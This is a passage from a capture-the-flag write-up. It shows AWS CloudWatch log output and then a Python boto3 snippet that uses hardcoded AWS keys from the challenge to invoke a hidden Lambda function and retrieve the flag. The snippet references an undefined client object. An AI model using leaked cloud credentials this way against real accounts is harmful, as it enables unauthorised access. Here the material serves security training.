            "timestamp": 1670252183315,
            "message": "REPORT RequestId: 3a8e49c7-b64d-4d11-8761-a07891458f99\tDuration: 1.87 ms\tBilled Duration: 2 ms\tMemory Size: 128 MB\tMax Memory Used: 52 MB\tInit Duration: 241.40 ms\t\n",
            "ingestionTime": 1670252189901
        },
        {
            "timestamp": 1670252370910,
            "message": "START RequestId: 5b26f7d1-5466-424a-9c6c-8a3e9d1e27b2 Version: $LATEST\n",
            "ingestionTime": 1670252379935
        },
        {
            "timestamp": 1670252370910,
            "message": "Received the following URL\n",
            "ingestionTime": 1670252379935
        },
        {
            "timestamp": 1670252370910,
            "message": "https://meowolympurr.blob.core.windows.net/blob/meowolympurr/scm-releases/?restype=container\n",
            "ingestionTime": 1670252379935
        },
        {
            "timestamp": 1670252370911,
            "message": "END RequestId: 5b26f7d1-5466-424a-9c6c-8a3e9d1e27b2\n",
            "ingestionTime": 1670252379935
        },
        {
            "timestamp": 1670252370911,
            "message": "REPORT RequestId: 5b26f7d1-5466-424a-9c6c-8a3e9d1e27b2\tDuration: 1.05 ms\tBilled Duration: 2 ms\tMemory Size: 128 MB\tMax Memory Used: 53 MB\t\n",
            "ingestionTime": 1670252379935
        }
    ],
    "nextForwardToken": "f/37247872540927872697607487793858676019080379473711726596/s",
    "nextBackwardToken": "b/37247868357374975688858178081445771297718061627273183232/s"
}
```
This looks like some URLs that other CTF players tried to submit to the API. We can conclude from here that each invoke of the `web-service` Lambda function will log the URL that the user submitted. Thinking back on the challenge description "Log a cy-purr security case by invoking the mysterious function and retrieve the secret code!", our goal should be to invoke the Lambda function that logs to `/aws/lambda/internal-secret-of-MeowOlympurr-webservice`. This requires us to find the right function name, however `aws lambda list-functions` seems to be explicitly disallowed in our AWS role. I was stuck here for very long, until I realised a simple fact: by default, all AWS log groups are named after the Lambda function that produces the logs. We can see the case for `event-webservice`, so lets try `internal-secret-of-MeowOlympurr-webservice` as the function name. Modifying the Python snippet we have earlier on:
```python
import boto3
import requests
import json
import azure.functions as func
functionName = "internal-secret-of-MeowOlympurr-webservice"
keyName = "AKIA5G4XMRW7TLT6XD7R"
secret = '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'  # gotten from azure vault
url = 'https://enqr1887xbuvq.x.pipedream.net/'  # Requestbin end point (but pretty useless in solving)
session = boto3.Session(
    aws_access_key_id=keyName,
    aws_secret_access_key=secret
)
details = {"url" : url}
r = lambda_client.invoke(
    FunctionName=functionName,
    InvocationType="RequestResponse",
    Payload=bytes(json.dumps(details), "utf-8")
)
```
It invokes successfully! That means the function indeed exists. Thinking back on the log message "Details returned in response", we check the returned object for flag, and in the `payload` property of it, we finally found the flag!
The code to read the response is `r['Payload'].read().decode('utf-8')`. You can see the full code in [this notebook.](get flag.ipynb)

Flag is `STF22{LIveInTh3Me0wmen7_:3}`.